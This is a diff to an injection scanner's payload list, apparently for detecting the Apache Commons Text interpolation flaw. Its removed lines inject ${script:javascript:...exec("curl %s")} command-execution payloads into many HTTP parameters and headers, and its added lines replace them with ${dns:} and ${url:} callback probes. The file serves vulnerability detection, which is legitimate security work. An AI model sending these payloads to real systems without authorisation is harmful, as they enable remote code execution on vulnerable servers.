@@ -1,87 +1,45 @@
 # Lines starting with # are ignored
-#param,u,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,href,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,action,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,host,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#param,http_host,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#param,email,root@${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#param,url,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,load,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,preview,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,target,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,proxy,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,from,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,src,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,ref,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,referrer,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#param,u,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,href,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,action,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,host,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-#param,http_host,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-#param,email,root@script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-#param,url,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,load,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,preview,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,target,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,proxy,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,from,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,src,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,ref,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#param,referrer,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
+#param,u,${dns:%s}
+#param,href,${dns:%s}
+#param,action,${dns:%s}
+#param,host,${dns:%s}
+#param,http_host,${dns:%s}
+#param,email,root@${dns:%s}
+#param,url,${dns:%s}
+#param,load,${dns:%s}
+#param,preview,${dns:%s}
+#param,target,${dns:%s}
+#param,proxy,${dns:%s}
+#param,from,${dns:%s}
+#param,src,${dns:%s}
+#param,ref,${dns:%s}
+#param,referrer,${dns:%s}
 # %h is replaced with corresponding Host header
 # Useful in cases like Host, Origin, etc.
-#header,Host,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}:80@%h
-header,Contact,root@${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,From,root@${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,User-Agent,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,Referer,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/ref
-#header,X-Original-URL,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-header,X-Wap-Profile,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/wap.xml
-#header,Profile,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/wap.xml
-#header,X-Arbitrary,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#header,X-HTTP-DestinationURL,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#header,X-Forwarded-Proto,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}/
-#header,Origin,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#header,X-Forwarded-Host,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#header,X-Forwarded-Server,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#header,X-Host,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#header,Proxy-Host,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#header,Destination,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#header,Proxy,http://${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#header,Via,1.1 ${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,X-Forwarded-For,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,True-Client-IP,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,Client-IP,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,X-Client-IP,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,X-Real-IP,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,X-Originating-IP,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,CF-Connecting_IP,${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-header,Forwarded,for=${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");};by=${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");};host=${script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s");}
-#header,Host,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\"):80@%h
-header,Contact,root@script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,From,root@script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,User-Agent,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,Referer,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/ref
-#header,X-Original-URL,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-header,X-Wap-Profile,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/wap.xml
-#header,Profile,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/wap.xml
-#header,X-Arbitrary,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#header,X-HTTP-DestinationURL,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#header,X-Forwarded-Proto,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")/
-#header,Origin,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-#header,X-Forwarded-Host,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-#header,X-Forwarded-Server,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-#header,X-Host,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-#header,Proxy-Host,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-#header,Destination,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-#header,Proxy,http://script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-#header,Via,1.1 script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,X-Forwarded-For,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,True-Client-IP,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,Client-IP,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,X-Client-IP,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,X-Real-IP,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,X-Originating-IP,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,CF-Connecting_IP,script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
-header,Forwarded,for=script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\");by=script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\");host=script:javascript:java.lang.Runtime.getRuntime().exec(\"curl %s\")
+#header,Host,${dns:%s}:80@%h
+header,Contact,root@${dns:%s}
+header,From,root@${dns:%s}
+header,User-Agent,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@${dns:%s}
+header,Referer,${url:UTF-8:http://%s}
+header,X-Original-URL,${url:UTF-8:http://%s}
+header,X-Wap-Profile,${url:UTF-8:http://%s}
+header,Profile,${url:UTF-8:http://%s}
+header,X-Arbitrary,${url:UTF-8:http://%s}
+header,X-HTTP-DestinationURL,${url:UTF-8:http://%s}
+header,X-Forwarded-Proto,${url:UTF-8:http://%s}
+header,Origin,${url:UTF-8:http://%s}
+header,X-Forwarded-Host,${dns:%s}
+header,X-Forwarded-Server,${dns:%s}
+header,X-Host,${dns:%s}
+header,Proxy-Host,${dns:%s}
+header,Destination,${dns:%s}
+header,Proxy,http://%s
+#header,Via,1.1 ${dns:%s}
+header,X-Forwarded-For,spoofed.${dns:%s}
+header,True-Client-IP,spoofed.${dns:%s}
+header,Client-IP,spoofed.${dns:%s}
+header,X-Client-IP,spoofed.${dns:%s}
+header,X-Real-IP,spoofed.${dns:%s}
+header,X-Originating-IP,spoofed.${dns:%s}
+header,CF-Connecting_IP,spoofed.${dns:%s}
+header,Forwarded,for=spoofed.${dns:%s};by=spoofed.${dns:%s};host=spoofed.${dns:%s}
